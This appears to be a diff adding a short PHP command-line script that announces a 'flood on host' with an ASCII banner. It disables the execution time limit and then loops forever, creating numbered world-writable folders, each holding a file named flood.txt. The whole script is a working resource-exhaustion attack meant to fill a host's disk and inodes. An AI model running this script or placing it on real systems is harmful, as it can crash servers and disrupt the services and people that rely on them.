@@ -1,0 +1,29 @@
+#!/usr/bin/env php
+<?php
+
+ini_set('max_execution_time', 0);
+
+$count = 0;
+$defaultPath = getcwd();
+
+echo "\n\e[91m
+▄████  █    ████▄ ████▄ ██▄   
+█▀   ▀ █    █   █ █   █ █  █  
+█▀▀    █    █   █ █   █ █   █ 
+█      ███▄ ▀████ ▀████ █  █  
+ █         ▀            ███▀  
+  ▀\e[0m
+\n";
+
+echo "\n\e[92m[*] Starting flood on host\e[0m\n";
+
+while (true) {
+    $folder = "file_{$count}";
+    mkdir($folder, 0777, true);
+    chdir($folder);
+    $file = fopen('flood.txt', 'w+');
+    fwrite($file, "Flood :D");
+    fclose($file);
+    chdir($defaultPath);
+    $count++;
+}
